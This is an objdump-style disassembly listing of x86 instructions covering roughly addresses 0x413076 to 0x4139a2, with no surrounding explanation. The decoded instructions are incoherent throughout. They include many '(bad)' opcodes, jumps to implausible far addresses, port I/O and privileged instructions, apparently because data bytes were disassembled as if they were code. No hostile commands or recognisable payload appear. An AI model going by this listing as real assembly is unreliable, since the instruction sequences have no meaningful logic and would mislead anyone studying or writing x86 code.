  413076:	out    0x29,al
  413078:	or     BYTE PTR [ecx],bl
  41307a:	(bad)  
  41307b:	sub    dl,BYTE PTR [edx-0x48e3d06e]
  413081:	lahf   
  413082:	fild   WORD PTR [ebx]
  413084:	or     DWORD PTR [eax],0xffffffc4
  413087:	sub    DWORD PTR [eax],eax
  413089:	popf   
  41308a:	xlat   BYTE PTR ds:[ebx]
  41308b:	xor    edx,DWORD PTR [ecx+0x4d3bb691]
  413091:	cdq    
  413092:	(bad)  
  413094:	push   ss
  413095:	and    DWORD PTR [edx+0x40],0xcc2fea57
  41309c:	jmp    0x413076
  41309e:	sahf   
  41309f:	les    ecx,FWORD PTR [ebx-0x76]
  4130a2:	adc    DWORD PTR [ebx],eax
  4130a4:	dec    edi
  4130a5:	xchg   edx,eax
  4130a6:	scas   al,BYTE PTR es:[edi]
  4130a7:	mov    edi,0x3df9537
  4130ac:	mov    WORD PTR [ecx-0x4d],ss
  4130af:	mov    ch,0xcc
  4130b1:	xchg   esp,eax
  4130b2:	jle    0x413063
  4130b4:	mov    esp,DWORD PTR [ecx]
  4130b6:	in     al,dx
  4130b7:	aas    
  4130b8:	sahf   
  4130b9:	rcr    edi,cl
  4130bb:	lahf   
  4130bc:	in     al,dx
  4130bd:	(bad)  
  4130be:	fild   WORD PTR [ebx]
  4130c0:	mov    WORD PTR [edi+edx*8],ss
  4130c3:	add    eax,0x0
	...
  4130d8:	mov    WORD PTR [eax],cs
  4130da:	call   0x57ddb107
  4130df:	jbe    0x41307c
  4130e1:	xchg   ecx,eax
  4130e2:	sbb    esp,DWORD PTR ss:[ebx]
  4130e5:	xchg   ebp,eax
  4130e6:	or     cl,ch
  4130e8:	(bad)  
  4130e9:	jl     0x4130bd
  4130eb:	add    esp,DWORD PTR [ebp-0x28630a6e]
  4130f1:	jns    0x413074
  4130f3:	cld    
  4130f4:	je     0x413088
  4130f6:	test   eax,0x8d4f929
  4130fb:	test   DWORD PTR [eax+ecx*8+0x8],esp
  4130ff:	jmp    0x25c2c593
  413104:	in     al,dx
  413105:	xchg   edx,eax
  413106:	cmp    ebp,ecx
  413108:	(bad)  
  413109:	xchg   esp,eax
  41310a:	or     BYTE PTR [edi+edi*4-0x301ed707],dl
  413111:	xchg   ecx,eax
  413112:	ins    DWORD PTR es:[edi],dx
  413113:	sar    BYTE PTR [ecx+edx*8+0x1c2c3908],0x2b
  41311b:	jmp    0xc649c5af
  413120:	and    bl,BYTE PTR [ecx-0x2df1290b]
  413126:	ss sub eax,0xce799148
  41312c:	adc    BYTE PTR [ecx+0x5a571d18],cl
  413132:	dec    ebx
  413133:	popf   
  413134:	mov    ss,WORD PTR [eax+ecx*1-0xa5b5f17]
  41313b:	aam    0x0
	...
  41314d:	add    BYTE PTR [eax],al
  41314f:	add    bh,cl
  413151:	push   es
  413152:	dec    eax
  413153:	jmp    0xfb0df9bc
  413158:	dec    esi
  413159:	xchg   ecx,eax
  41315a:	in     eax,dx
  41315b:	jge    0x4130ee
  41315d:	xchg   ecx,eax
  41315e:	cmc    
  41315f:	push   0x5b
  413161:	test   eax,0x1e42aee1
  413166:	in     al,0x72
  413168:	ficomp DWORD PTR [ecx+eax*4+0x7a919fac]
  41316f:	loope  0x4131e5
  413171:	adc    DWORD PTR [ecx+0x894e500],esi
  413177:	jmp    DWORD PTR [edi]
  413179:	mov    DWORD PTR [esi+0x895b180],eax
  41317f:	add    BYTE PTR [edx+0x658f0547],ch
  413185:	add    esi,esi
  413187:	push   DWORD PTR [ebp+0x26c43417]
  41318d:	push   esi
  41318e:	cmc    
  41318f:	jmp    DWORD PTR [ecx]
  413191:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413192:	cmc    
  413193:	xor    eax,0x484865
  413198:	stos   BYTE PTR es:[edi],al
  413199:	jle    0x413164
  41319b:	jae    0x413191
  41319d:	xchg   esp,eax
  41319e:	loopne 0x413151
  4131a0:	mov    edi,0xa5b8f6bb
  4131a5:	xchg   esp,eax
  4131a6:	or     BYTE PTR [eax],al
  4131a8:	enter  0x29d2,0x0
  4131ac:	rol    DWORD PTR [edi],1
  4131ae:	or     eax,0x8946500
  4131b3:	add    DWORD PTR [eax],0x0
	...
  4131c6:	add    BYTE PTR [eax],al
  4131c8:	and    dl,BYTE PTR [ebp-0x788ac077]
  4131ce:	mov    WORD PTR [edi],?
  4131d0:	sbb    bh,BYTE PTR [eax-0x434f740a]
  4131d6:	push   esi
  4131d7:	leave  
  4131d8:	daa    
  4131d9:	xchg   ebp,eax
  4131da:	or     BYTE PTR [ebp-0x42],dl
  4131dd:	lods   al,BYTE PTR ds:[esi]
  4131de:	mov    al,ah
  4131e0:	sbb    DWORD PTR [edi+0x45],ebx
  4131e3:	pop    eax
  4131e4:	lea    eax,[esi-0x3]
  4131e7:	inc    eax
  4131e8:	and    eax,0xf60177bc
  4131ed:	mov    bh,0x82
  4131ef:	leave  
  4131f0:	scas   al,BYTE PTR es:[edi]
  4131f1:	shl    DWORD PTR [edx],1
  4131f3:	imul   BYTE PTR [esi+0x4afa6dd1]
  4131f9:	jbe    0x413203
  4131fb:	mov    edi,DWORD PTR [edi+eax*1-0xd7303b3]
  413202:	xor    ebp,edx
  413204:	xchg   esi,eax
  413205:	repnz xor eax,DWORD PTR [edx]
  413208:	retf   0x3402
  41320b:	dec    edi
  41320c:	pop    ss
  41320d:	lds    edx,FWORD PTR [edi+edi*8]
  413210:	xchg   edi,eax
  413211:	jge    0x41321c
  413213:	mov    eax,ebp
  413215:	and    eax,0xbb8fc872
  41321a:	jno    0x4131e4
  41321c:	retf   
  41321d:	inc    eax
  41321e:	sub    eax,0xca94182
  413223:	jne    0x4131d1
  413225:	aas    
  413226:	xor    al,0xc2
  413228:	pop    ecx
  413229:	add    dl,BYTE PTR [ecx]
  41322b:	dec    edi
	...
  413240:	inc    esp
  413241:	and    eax,0x7d4cf783
  413246:	and    DWORD PTR [ecx-0x73],esi
  413249:	mov    edx,0x85498a2d
  41324e:	repnz mov edi,0x4128200
  413254:	xor    BYTE PTR [ebp+0x2b],0x7
  413258:	int3   
  413259:	std    
  41325a:	loope  0x41325b
  41325c:	clc    
  41325d:	dec    edi
  41325e:	xor    al,0xc1
  413260:	nop
  413261:	jge    0x41323b
  413263:	mov    dh,BYTE PTR [eax-0x6]
  413266:	xor    eax,0xc4adbff3
  41326b:	addr16 dec esp
  41326d:	xor    eax,0xab43ffc9
  413272:	or     eax,ebx
  413274:	inc    ebx
  413275:	ds enter 0x8cf3,0x7d
  41327a:	or     DWORD PTR [eax],eax
  41327c:	xor    dh,BYTE PTR [bx+si+0x44]
  413280:	sub    BYTE PTR [ebp+0x1594742d],ch
  413286:	or     cl,BYTE PTR ss:[ebp+edi*2-0x6b6b4078]
  41328e:	adc    al,0x27
  413290:	sbb    BYTE PTR [edi+edx*2+0x5e8f9a8a],0x7c
  413298:	push   eax
  413299:	mov    WORD PTR [edi-0x11a0142d],ds
  41329f:	es jmp 0x0:0x2fac1c
	...
  4132b7:	add    dl,ah
  4132b9:	or     BYTE PTR [ebx+ebx*1],bh
  4132bc:	adc    DWORD PTR [edx+0x548703df],ebx
  4132c2:	xchg   ebx,eax
  4132c3:	bswap  ebx
  4132c5:	or     BYTE PTR [eax],ch
  4132c7:	cmp    BYTE PTR es:[eax-0x514ce451],cl
  4132ce:	push   es
  4132cf:	es mov dl,0x8
  4132d2:	or     al,0x1b
  4132d4:	pop    ds
  4132d5:	call   0x1be8:0x8a303df
  4132dc:	pop    ds
  4132dd:	lods   eax,DWORD PTR ds:[esi]
  4132de:	out    0x25,al
  4132e0:	push   cs
  4132e1:	adc    esp,edx
  4132e3:	add    al,0x0
  4132e5:	scas   eax,DWORD PTR es:[edi]
  4132e6:	push   edi
  4132e7:	dec    eax
  4132e8:	(bad)  
  4132e9:	rcr    edi,cl
  4132eb:	and    al,0x0
  4132ed:	mov    edi,eax
  4132ef:	sbb    DWORD PTR [esi+0x2bf8df94],eax
  4132f5:	or     ebp,ebp
  4132f7:	push   0x3df948c
  4132fc:	pop    ebx
  4132fd:	or     BYTE PTR [esp+ebx*1+0x25aeade9],bh
  413304:	push   ss
  413305:	push   edx
  413306:	dec    edx
  413307:	cmp    ecx,DWORD PTR [ebp-0x67]
  41330a:	(bad)  
  41330c:	push   es
  41330d:	sub    DWORD PTR [edi],0x88e4abcc
  413313:	les    ebp,FWORD PTR [ebx]
  413315:	xchg   cl,dh
  413317:	add    cl,BYTE PTR [edi-0x72]
  41331a:	or     BYTE PTR [esi+0x0],dh
	...
  41332d:	add    BYTE PTR [eax],al
  41332f:	add    bl,ch
  413331:	xchg   ebp,eax
  413332:	loopne 0x41336c
  413334:	xchg   DWORD PTR [ebp-0x9f82c0b],ecx
  41333a:	and    DWORD PTR [ecx-0x23097232],esi
  413340:	div    DWORD PTR [ebp-0xb]
  413343:	repnz test al,0x8e
  413346:	(bad)
  41334b:	test   al,0x8f
  41334d:	lea    edi,[ebx-0x1f]
  413350:	ja     0x4133cf
  413352:	adc    DWORD PTR [esi],ebp
  413354:	test   eax,0xa7f17b8e
  413359:	inc    edx
  41335a:	repz push ds
  41335c:	imul   eax,DWORD PTR [ebp+0x7],0xbf948fe9
  413363:	sub    ecx,DWORD PTR [esp+edx*4+0x1284725b]
  41336a:	int3   
  41336b:	add    DWORD PTR [eax+0x675060e5],edi
  413371:	int    0x8
  413373:	icebp  
  413374:	fst    QWORD PTR [ecx+ecx*8+0x508b0e6]
  41337b:	fidiv  WORD PTR [edx]
  41337d:	xchg   ebp,eax
  41337e:	loopne 0x413325
  413380:	xchg   edx,eax
  413381:	(bad)  
  413382:	cmc    
  413383:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413384:	xor    cl,BYTE PTR [ecx-0x6b7016f9]
  41338a:	and    DWORD PTR [eax+esi*4],0xffffffdd
  41338e:	pusha  
  41338f:	cdq    
  413390:	sbb    al,0xd4
  413392:	or     cl,al
	...
  4133a8:	sar    BYTE PTR [ecx+0x4d44a6f5],cl
  4133ae:	jl     0x41337b
  4133b0:	pop    edi
  4133b1:	adc    dh,BYTE PTR [ebx-0x6f]
  4133b4:	lahf   
  4133b5:	pop    es
  4133b6:	pop    ds
  4133b7:	add    ebx,DWORD PTR [eax+0x2800f5e4]
  4133bd:	test   ebp,ebp
  4133bf:	cmp    BYTE PTR [edx-0x48],al
  4133c2:	test   BYTE PTR [ebx],0xe5
  4133c5:	cmp    al,0xe
  4133c7:	(bad)  
  4133c8:	push   0xf5fff5bc
  4133cd:	nop
  4133ce:	loopne 0x413391
  4133d0:	add    edi,DWORD PTR [eax-0x4ad7740a]
  4133d6:	rol    dl,0xed
  4133d9:	nop
  4133da:	pop    ebx
  4133db:	mov    eax,DWORD PTR [ecx+0x64]
  4133de:	inc    ebp
  4133df:	pop    eax
  4133e0:	mov    ebp,0xe540f0be
  4133e5:	mov    eax,0xb8a60177
  4133ea:	and    bl,bl
  4133ec:	jb     0x41342c
  4133ee:	or     eax,0xf6b7f4e8
  4133f3:	jmp    FWORD PTR [esi+0x3b8406d0]
  4133f9:	xchg   ecx,eax
  4133fa:	or     BYTE PTR [eax],al
  4133fc:	xchg   edx,eax
  4133fd:	ds or  eax,0xf59f11e8
  413403:	jmp    FWORD PTR [esi-0x73fa8330]
  413409:	or     esi,esi
  41340b:	inc    DWORD PTR [eax]
	...
  41341d:	add    BYTE PTR [eax],al
  41341f:	add    BYTE PTR [ebp-0x49],dh
  413422:	jl     0x413430
  413424:	bound  ebp,QWORD PTR [esi]
  413426:	or     eax,0xf6b7c6e8
  41342b:	inc    DWORD PTR [edx+0x2e]
  41342e:	or     eax,0xf595c4e8
  413433:	call   FWORD PTR [esi-0x28]
  413436:	jl     0x41343a
  413438:	dec    esi
  413439:	and    dh,dh
  41343b:	jne    0x4134aa
  41343d:	shr    BYTE PTR [edx],0x1c
  413440:	repnz mov bh,0x2
  413443:	rcr    BYTE PTR [eax-0x739c1e6e],0x22
  41344a:	pop    DWORD PTR [edi]
  41344c:	and    al,0xa7
  41344e:	or     bh,bh
  413450:	sub    eax,DWORD PTR [edi+0x268e7449]
  413456:	scas   eax,DWORD PTR es:[edi]
  413457:	addr16 ret 0xcbba
  41345b:	call   DWORD PTR [edx]
  41345d:	add    DWORD PTR [ecx],0x299340e8
  413463:	(bad)  
  413464:	xchg   edi,eax
  413465:	mov    ebp,0x3fe7018f
  41346a:	sub    dh,BYTE PTR [esp+eax*4-0x2b]
  41346e:	adc    BYTE PTR [edx],bl
  413470:	jmp    0x413444
  413472:	add    eax,0x267f59c0
  413477:	xor    ebx,ebx
  413479:	dec    eax
  41347a:	add    eax,ebp
  41347c:	inc    eax
  41347d:	pop    ecx
  41347e:	sub    bh,dh
  413480:	xchg   edi,eax
  413481:	mov    ebp,0x18f
	...
  413496:	add    BYTE PTR [eax],al
  413498:	mov    bh,0x53
  41349a:	sub    dh,BYTE PTR [esp+eax*4-0x6b]
  41349e:	adc    DWORD PTR [ebx+esi*4],edx
  4134a1:	call   0x2b0c:0xa6cf78d
  4134a8:	int3   
  4134a9:	xchg   BYTE PTR [ecx+0x73],cl
  4134ac:	jg     0x4134ee
  4134ae:	or     DWORD PTR [eax],eax
  4134b0:	jl     0x41352f
  4134b2:	sahf   
  4134b3:	or     eax,DWORD PTR [edi+0x7c]
  4134b6:	or     DWORD PTR [eax],eax
  4134b8:	mov    WORD PTR [esi+0x0],fs
  4134bb:	mov    ebx,0x97d8f
  4134c0:	pop    es
  4134c1:	ds mov dh,0xc8
  4134c4:	dec    esi
  4134c5:	test   DWORD PTR [ecx],ecx
  4134c7:	push   ebp
  4134c8:	pop    ss
  4134c9:	pop    ecx
  4134ca:	mov    ecx,0x1404e457
  4134cf:	aas    
  4134d0:	mov    WORD PTR [ebp-0x65],es
  4134d3:	add    BYTE PTR [edi-0x6c],cl
  4134d6:	scas   al,BYTE PTR es:[edi]
  4134d7:	and    bh,BYTE PTR [eax-0x6c676968]
  4134dd:	jl     0x4134a0
  4134df:	and    dh,BYTE PTR [edx]
  4134e1:	mov    ebp,edx
  4134e3:	inc    ebx
  4134e4:	mov    al,ds:0x97988eae
  4134e9:	mov    edi,esp
  4134eb:	or     esp,DWORD PTR [edi+eiz*4]
  4134ee:	jle    0x413512
  4134f0:	adc    bl,BYTE PTR [edi-0x74696761]
  4134f6:	aam    0xf
  4134f8:	add    eax,DWORD PTR [ecx]
  4134fa:	clc    
  4134fb:	sub    eax,DWORD PTR [eax]
	...
  41350d:	add    BYTE PTR [eax],al
  41350f:	add    BYTE PTR [edi-0x3bdda175],cl
  413515:	push   ebp
  413516:	out    0x3,eax
  413518:	inc    ecx
  413519:	pop    ds
  41351a:	pop    ebx
  41351b:	xchg   bh,cl
  41351d:	outs   dx,DWORD PTR ds:[esi]
  41351e:	xchg   edx,eax
  41351f:	mov    edx,0x1dc7ec4b
  413524:	aad    0xd3
  413526:	fistp  WORD PTR [ebx]
  413528:	cmp    eax,0x76222295
  41352d:	outs   dx,DWORD PTR ds:[esi]
  41352e:	pop    ss
  41352f:	fimul  WORD PTR [esi-0x75]
  413532:	push   ds
  413533:	dec    edx
  413534:	dec    eax
  413535:	js     0x413516
  413537:	add    ecx,DWORD PTR [esp+edx*4-0x1c483784]
  41353e:	pop    ss
  41353f:	xor    bh,BYTE PTR [edi-0x75]
  413542:	inc    BYTE PTR [ebp-0x672087f0]
  413548:	mov    ds:0xd3302417,eax
  41354d:	jl     0x41350e
  41354f:	clc    
  413550:	jp     0x4134dc
  413552:	bound  ebx,QWORD PTR [edi+0xb5c9567]
  413558:	sbb    eax,edx
  41355a:	(bad)  [ebx+ebp*2+0x5a20db64]
  413561:	push   ss
  413562:	or     BYTE PTR [esp+ebx*4],dh
  413565:	mov    DWORD PTR [esi],eax
  413567:	gs push ds
  413569:	mov    dh,ch
  41356b:	jmp    0x3a3a0682
  413570:	ins    DWORD PTR es:[edi],dx
  413571:	add    ch,ah
  413573:	add    DWORD PTR [eax],0x0
	...
  413585:	add    BYTE PTR [eax],al
  413587:	add    bl,ch
  413589:	mov    dh,ch
  41358b:	mov    ss,WORD PTR [ecx]
  41358d:	add    BYTE PTR [edi],0xfc
  413590:	add    cl,BYTE PTR [ebx+0x6a]
  413593:	es dec edi
  413595:	mov    ah,dl
  413597:	adc    ch,al
  413599:	shr    ah,1
  41359b:	jecxz  0x41352c
  41359d:	xchg   esp,eax
  41359e:	or     BYTE PTR [esi],ch
  4135a0:	retf   
  4135a1:	jno    0x4135ab
  4135a3:	jmp    0xacc4ca37
  4135a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4135a9:	fprem1 
  4135ab:	aam    0xbb
  4135ad:	loop   0x41358f
  4135af:	aad    0xc9
  4135b1:	mov    dh,ch
  4135b3:	repnz dec edi
  4135b5:	add    eax,0x71f36a19
  4135ba:	or     BYTE PTR [ebp+0x117b8999],dh
  4135c0:	jo     0x41357c
  4135c2:	repz push ds
  4135c4:	ins    DWORD PTR es:[edi],dx
  4135c5:	push   ds
  4135c6:	rcl    BYTE PTR [esi],1
  4135c8:	sbb    esi,DWORD PTR [edx-0x20]
  4135cb:	jbe    0x413571
  4135cd:	mov    dh,ch
  4135cf:	repnz pusha 
  4135d1:	add    BYTE PTR [edx+ebp*2],bl
  4135d4:	sti    
  4135d5:	jne    0x4135df
  4135d7:	jge    0x413655
  4135d9:	mov    DWORD PTR [ebx+0x5],eax
  4135dc:	cmp    BYTE PTR [ecx],dl
  4135de:	sbb    ecx,ebp
  4135e0:	(bad)  
  4135e1:	jl     0x4135b2
  4135e3:	icebp  
  4135e4:	(bad)  
  4135e5:	xchg   esp,eax
  4135e6:	loope  0x413586
  4135e8:	mov    al,ds:0x694d94
	...
  4135fd:	add    BYTE PTR [eax],al
  4135ff:	add    BYTE PTR [ecx+ecx*4+0x7c],ch
  413603:	add    BYTE PTR [edi+0x5c],cl
  413606:	jne    0x413647
  413608:	and    DWORD PTR gs:[ecx],ecx
  41360b:	or     edi,esi
  41360d:	and    BYTE PTR [ebx+0x5211e0b],dl
  413613:	push   0x45
  413615:	sbb    cl,BYTE PTR [eax+esi*8+0x75]
  413619:	cmp    ch,al
  41361b:	jae    0x413681
  41361d:	nop
  41361e:	loopne 0x41367d
  413620:	dec    esp
  413621:	mov    ah,0xf6
  413623:	jmp    DWORD PTR [eax]
  413625:	mov    ecx,0xb44150ed
  41362a:	test   BYTE PTR [ebx-0x36adac1a],0x36
  413631:	inc    edx
  413632:	sub    ah,0x74
  413635:	rcl    DWORD PTR [ebp+0x5eb45afe],1
  41363b:	push   esi
  41363c:	xor    eax,0x3eec6d4d
  413641:	push   ebp
  413642:	cmc    
  413643:	mul    DWORD PTR [edi]
  413645:	xchg   esi,eax
  413646:	leave  
  413647:	call   FWORD PTR [edx-0x31]
  41364a:	dec    esi
  41364b:	inc    ecx
  41364c:	in     eax,0x14
  41364e:	ss add dl,ch
  413651:	adc    dl,al
  413653:	add    DWORD PTR [ebp-0x5e7a7c6c],esi
  413659:	mov    bl,0xf6
  41365b:	push   ebp
  41365d:	dec    ebx
  41365e:	in     eax,dx
  41365f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413660:	fidiv  DWORD PTR [ebx+0xbf6]
	...
  413676:	add    BYTE PTR [eax],al
  413678:	jne    0x41361e
  41367a:	mov    WORD PTR [esp+eiz*4+0x58830894],fs
  413681:	mov    eax,ds:0x937afff3
  413686:	add    eax,0x8920284
  41368b:	add    al,ch
  41368d:	sbb    eax,0x5e8cfead
  413692:	adc    eax,0x10216b4f
  413697:	std    
  413698:	arpl   WORD PTR [edi+0x24],cx
  41369b:	inc    ecx
  41369c:	ja     0x4136e4
  41369e:	adc    eax,0x4ff55a2a
  4136a3:	mov    ds:0xea15374a,eax
  4136a8:	jnp    0x413711
  4136aa:	push   es
  4136ab:	mov    dh,0x10
  4136ad:	pop    eax
  4136ae:	popa   
  4136af:	std    
  4136b0:	xor    ebx,DWORD PTR [edi]
  4136b2:	mov    esp,0xcbab2067
  4136b7:	call   DWORD PTR [eax]
  4136b9:	stc    
  4136ba:	dec    edx
  4136bb:	std    
  4136bc:	sbb    eax,DWORD PTR [edi]
  4136be:	mov    ebp,0x975abe7
  4136c3:	add    BYTE PTR [edi],cl
  4136c5:	xor    bl,BYTE PTR [eax]
  4136c7:	lea    ecx,[ecx]
  4136c9:	mov    esp,0x4dfbfe16
  4136ce:	push   ss
  4136cf:	mov    ah,0x28
  4136d1:	loopne 0x4136e8
  4136d3:	(bad)  
  4136d4:	hlt    
  4136d5:	xchg   edx,eax
  4136d6:	in     al,dx
  4136d7:	(bad)  
  4136d8:	jecxz  0x4136de
  4136da:	and    BYTE PTR [ebx+0x0],0x0
	...
  4136ed:	add    BYTE PTR [eax],al
  4136ef:	add    dl,bl
  4136f1:	(bad)  
  4136f2:	adc    eax,0xfcc00f45
  4136f7:	jno    0x4136c9
  4136f9:	mov    dh,0x4f
  4136fb:	repz ret 0x15ae
  4136ff:	out    0x66,eax
  413701:	jg     0x413719
  413703:	dec    bl
  413705:	clc    
  413706:	push   esp
  413707:	std    
  413708:	stos   DWORD PTR es:[edi],eax
  413709:	xchg   esi,eax
  41370a:	or     al,0x0
  41370c:	mov    WORD PTR [ebp-0x61],?
  41370f:	add    DWORD PTR [ecx],ecx
  413711:	icebp  
  413712:	push   esp
  413713:	std    
  413714:	xchg   ebx,eax
  413715:	jle    0x4136d0
  413717:	inc    BYTE PTR [ecx-0x7f]
  41371a:	adc    edi,esi
  41371c:	adc    DWORD PTR [edi+edx*8-0x29786071],0xa
  413724:	dec    esp
  413725:	xchg   edi,eax
  413726:	arpl   WORD PTR [ebx],bx
  413728:	imul   eax,DWORD PTR [edi+0x4c2084df],0xffffffcd
  41372f:	push   ds
  413730:	pop    edx
  413731:	fldcw  WORD PTR [ecx]
  413733:	add    al,0x8c
  413735:	xchg   edi,eax
  413736:	sub    ecx,DWORD PTR fs:[ebx-0x79]
  41373a:	fist   WORD PTR [eax+0x1ead8b08]
  413740:	cmp    ah,ah
  413742:	pop    ss
  413743:	or     BYTE PTR [ebp-0x6ad4206c],cl
  413749:	(bad)  
  41374a:	fild   WORD PTR [ebx]
  41374c:	xchg   edi,eax
  41374d:	push   esp
  41374e:	inc    BYTE PTR [edi+0x3df944a]
	...
  413768:	push   ecx
  413769:	nop
  41376a:	loopne 0x41376f
  41376c:	mov    WORD PTR [edi-0x78fcb892],ss
  413772:	fild   QWORD PTR [ebx]
  413774:	pop    ds
  413775:	(bad)  
  413776:	fild   WORD PTR [ebx]
  413778:	pop    esp
  413779:	cld    
  41377a:	dec    esp
  41377b:	xchg   edx,eax
  41377c:	dec    esp
  41377d:	xchg   esp,eax
  41377e:	push   esp
  41377f:	mov    ch,cl
  413781:	test   DWORD PTR [esi+0x1e],ecx
  413784:	dec    ebx
  413785:	jl     0x4137c0
  413787:	push   es
  413788:	mov    WORD PTR [edx+eiz*2-0x200568b9],ss
  41378f:	nop
  413790:	or     BYTE PTR [ebx-0x1c45e1d3],cl
  413796:	pop    ss
  413797:	cmp    BYTE PTR [ecx+0x1090df94],cl
  41379d:	mov    eax,DWORD PTR ds:0x17e3a21e
  4137a3:	and    dh,BYTE PTR [ecx-0x79]
  4137a6:	test   BYTE PTR [ecx],0xcc
  4137a9:	add    BYTE PTR [ecx],cl
  4137ab:	leave  
  4137ac:	aaa    
  4137ad:	inc    edx
  4137ae:	inc    eax
  4137af:	test   al,0x8f
  4137b1:	pop    ss
  4137b2:	mov    esp,edx
  4137b4:	call   0x15a8:0xa039f586
  4137bb:	(bad)  
  4137bc:	mov    DWORD PTR [eax],ebx
  4137be:	fwait
  4137bf:	stos   DWORD PTR es:[edi],eax
  4137c0:	add    BYTE PTR [esi+0x6e201bf5],0x6c
  4137c7:	fidiv  WORD PTR [eax-0x7a]
  4137ca:	loope  0x4137a6
	...
  4137e0:	sbb    dl,BYTE PTR [ecx]
  4137e2:	retf   0xa1af
  4137e5:	xchg   BYTE PTR [eax+0x74],bl
  4137e8:	adc    ecx,DWORD PTR [ebx-0x2a6e610a]
  4137ee:	loopne 0x413782
  4137f0:	sub    al,BYTE PTR [edi+0x4a0b60f5]
  4137f6:	test   BYTE PTR [esi+0x3dbb8679],0x72
  4137fd:	xchg   ch,dh
  4137ff:	jbe    0x413864
  413801:	xor    esi,0xf86da16e
  413807:	call   FWORD PTR [eax+0x14290186]
  41380d:	ret    
  41380e:	pusha  
  41380f:	push   eax
  413810:	std    
  413811:	aam    0x8
  413813:	inc    ecx
  413814:	xchg   ebx,eax
  413815:	mov    cs,WORD PTR [eax]
  413817:	jmp    0xbb31263b
  41381c:	into   
  41381d:	test   esi,esi
  41381f:	jl     0x413855
  413821:	xchg   ebp,esi
  413823:	cs jo  0x413861
  413826:	sub    eax,0x7fb9926
  41382b:	xchg   ebx,eax
  41382c:	(bad)  
  41382d:	cli    
  41382e:	or     BYTE PTR [esi],dl
  413830:	inc    ebx
  413831:	dec    ecx
  413832:	test   BYTE PTR [esi],0x81
  413835:	in     eax,dx
  413836:	fld    DWORD PTR [eax]
  413838:	fst    QWORD PTR [edx-0xb]
  41383b:	imul   esp,DWORD PTR [ebp+0x750765b9],0xb5f591
	...
  413855:	add    BYTE PTR [eax],al
  413857:	add    BYTE PTR [ecx+0x5dfff6a6],dh
  41385d:	xchg   esp,eax
  41385e:	adc    edi,edi
  413860:	push   edx
  413861:	test   al,0xbc
  413863:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413864:	inc    ebx
  413865:	test   al,0xf6
  413867:	call   0x37c3a9
  41386c:	push   edx
  41386d:	fdivp  st(1),st
  41386f:	(bad)  
  413870:	adc    ch,BYTE PTR [eax-0x57989313]
  413876:	idiv   ah
  413878:	inc    esi
  413879:	shl    DWORD PTR [eax-0x9580d01],1
  41387f:	bnd ret 
  413881:	imul   ecx,DWORD PTR [esi],0xf35eb80f
  413887:	call   DWORD PTR [edx]
  413889:	inc    edi
  41388a:	push   esi
  41388b:	leave  
  41388c:	out    0x3d,al
  41388e:	sub    ah,0xa6
  413891:	int    0xe5
  413893:	push   eax
  413894:	popf   
  413895:	cmp    dl,dl
  413897:	std    
  413898:	mov    ch,0x90
  41389a:	lock jb 0x413881
  41389d:	shl    esi,cl
  41389f:	mov    esi,DWORD PTR [edi-0xbfa91ff]
  4138a5:	nop
  4138a6:	or     al,ch
  4138a8:	or     BYTE PTR [ebx+0x1c35fff6],0xd7
  4138af:	nop
  4138b0:	pop    esp
  4138b1:	dec    esi
  4138b2:	icebp  
  4138b3:	nop
  4138b4:	cs ret 
  4138b6:	test   DWORD PTR [eax-0x58],ebp
  4138b9:	xchg   ecx,eax
  4138ba:	or     BYTE PTR [eax],al
	...
  4138d0:	popf   
  4138d1:	jmp    0x4138e2
  4138d3:	call   DWORD PTR [edx-0x732d7cff]
  4138d9:	hlt    
  4138da:	into   
  4138db:	out    dx,eax
  4138dc:	cld    
  4138dd:	adc    cl,BYTE PTR [esi]
  4138df:	add    DWORD PTR [ebx+edi*2-0x798957df],ecx
  4138e6:	adc    DWORD PTR [edx-0x2e7f21a2],ecx
  4138ec:	adc    eax,0x5e8a1139
  4138f1:	pop    es
  4138f2:	aas    
  4138f3:	(bad)  
  4138f4:	in     al,0x79
  4138f6:	or     al,0x0
  4138f8:	mov    WORD PTR [edx-0x69],gs
  4138fb:	sti    
  4138fc:	imul   BYTE PTR [ebp+0x21]
  4138ff:	push   ebx
  413900:	xchg   edx,eax
  413901:	ins    DWORD PTR es:[edi],dx
  413902:	or     DWORD PTR [eax-0x2e7adff9],edx
  413908:	dec    ebx
  413909:	rcr    DWORD PTR [edi+eiz*2],0x88
  41390d:	ins    BYTE PTR es:[edi],dx
  41390e:	or     DWORD PTR [eax],eax
  413910:	and    al,0x2
  413912:	or     BYTE PTR [eax],al
  413914:	mov    WORD PTR [esi-0x9838cb7],es
  41391a:	ds (bad) 
  41391c:	mov    ah,0x61
  41391e:	test   DWORD PTR [eax-0x74],eax
  413921:	sbb    dl,BYTE PTR [edi+0x7c824ef]
  413927:	add    BYTE PTR [esi+esi*8-0x687396c2],cl
  41392e:	or     al,0x6a
  413930:	mov    fs,WORD PTR [edi+0x9]
  413933:	push   0x0
	...
  413945:	add    BYTE PTR [eax],al
  413947:	add    BYTE PTR [edi-0x73fff69b],cl
  41394d:	lods   eax,DWORD PTR ds:[esi]
  41394e:	adc    DWORD PTR [esp+ebx*8-0x2b],esi
  413952:	pop    ss
  413953:	add    ecx,DWORD PTR [ebp+ebp*2+0x2dd84484]
  41395a:	push   es
  41395b:	rol    BYTE PTR [ecx+0x31],0x12
  41395f:	je     0x413921
  413961:	mov    dl,0x97
  413963:	out    dx,eax
  413964:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413965:	xchg   esp,eax
  413966:	pop    es
  413967:	add    DWORD PTR [esp+edx*4-0x6bca4867],ecx
  41396e:	push   ds
  41396f:	xchg   ecx,eax
  413970:	mov    bl,0x6c
  413972:	jno    0x413976
  413974:	mov    WORD PTR [edx+edi*8-0x606fe0bd],ss
  41397b:	stos   DWORD PTR es:[edi],eax
  41397c:	xchg   edi,eax
  41397d:	or     BYTE PTR [ecx-0x1c9323fd],ah
  413983:	(bad)  
  413984:	jnp    0x413909
  413986:	pop    ecx
  413987:	add    al,0xe6
  413989:	xchg   esp,eax
  41398a:	pop    ecx
  41398b:	push   es
  41398c:	not    BYTE PTR [ecx+ecx*2-0x206b0bf9]
  413993:	add    ecx,DWORD PTR [ebx+eax*4+0x34]
  413997:	adc    al,0x6b
  413999:	xor    ebp,ebx
  41399b:	add    ecx,DWORD PTR [ebp+ecx*1+0x8831024]
  4139a2:	dec    ebx
